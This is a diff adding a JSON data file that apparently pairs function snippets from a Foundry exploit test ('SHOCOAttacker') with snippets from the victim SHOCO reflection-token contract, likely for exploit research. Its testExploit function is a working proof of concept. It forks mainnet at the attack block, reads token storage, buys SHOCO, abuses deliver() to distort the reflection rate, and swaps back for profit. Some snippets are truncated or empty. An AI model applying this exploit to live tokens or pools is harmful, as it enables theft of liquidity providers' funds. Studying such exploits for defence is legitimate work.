@@ -1,0 +1,198 @@
+[
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "getMappingValue",
+    "original_code": "    function getMappingValue(address targetContract, uint256 mapSlot, address key) public returns (uint256) {\n        bytes32 slotValue = vm.load(targetContract, keccak256(abi.encode(key, mapSlot)));\n        return uint256(slotValue);\n    }\n\n    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\");\n\n        vm.label(address(shoco_weth), \"shoco-weth UniswapPair\");\n        vm.label(address(weth), \"WETH\");\n        vm.label(address(shoco), \"SHOCO\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SHOCOAttacker",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() external {\n        uint256 attackBlockNumber = 16_440_978;\n        vm.rollFork(attackBlockNumber);\n        emit log_named_decimal_uint(\"WETH balance\", weth.balanceOf(address(shoco_weth)), weth.decimals());\n        deal(address(weth), address(this), 2000 ether);\n\n        uint256 rTotal = uint256(vm.load(address(shoco), bytes32(uint256(14))));\n        uint256 rExcluded = getMappingValue(address(shoco), 3, address(0xCb23667bb22D8c16e742d3Cce6CD01642bAaCc1a));\n        uint256 rAmountOut = rTotal - rExcluded;\n        uint256 shocoAmountOut = shoco.tokenFromReflection(rAmountOut) - 0.1 * 10 ** 9;\n\n        (uint256 reserve0, uint256 reserve1,) = shoco_weth.getReserves();\n        uint256 wethAmountIn = getAmountIn(shocoAmountOut, reserve1, reserve0);\n        emit log_named_decimal_uint(\"WETH amountIn\", wethAmountIn, weth.decimals());\n        weth.transfer(address(shoco_weth), wethAmountIn);\n\n        shoco_weth.swap(shocoAmountOut, 0, address(this), \"\");\n\n        shoco.deliver(shoco.balanceOf(address(this)) * 99_999 / 100_000);\n\n        (reserve0, reserve1,) = shoco_weth.getReserves();\n        uint256 wethAmountOut = getAmountOut(shoco.balanceOf(address(shoco_weth)) - reserve0, reserve0, reserve1);\n        shoco_weth.swap(0, wethAmountOut, address(this), \"\");\n        if (wethAmountIn < wethAmountOut) {\n            emit log_named_decimal_uint(\"Attack profit:\", wethAmountOut - wethAmountIn, weth.decimals());\n        } else {\n            emit log_named_decimal_uint(\"Attack loss:\", wethAmountIn - wethAmountOut, weth.decimals());\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "deliver",
+    "original_code": "    function deliver(uint256 tAmount) public {\n        address sender = _msgSender();\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "    function name() public view returns (string memory) {\n        return _name;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "    function owner() public view returns (address) {\n        return _owner;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "tokenFromReflection",
+    "original_code": "    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\n        require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\n        uint256 currentRate =  _getRate();\n        return rAmount.div(currentRate);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "    function totalSupply() public view override returns (uint256) {\n        return _tTotal;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IReflection",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "",
+    "description": ""
+  }
+]
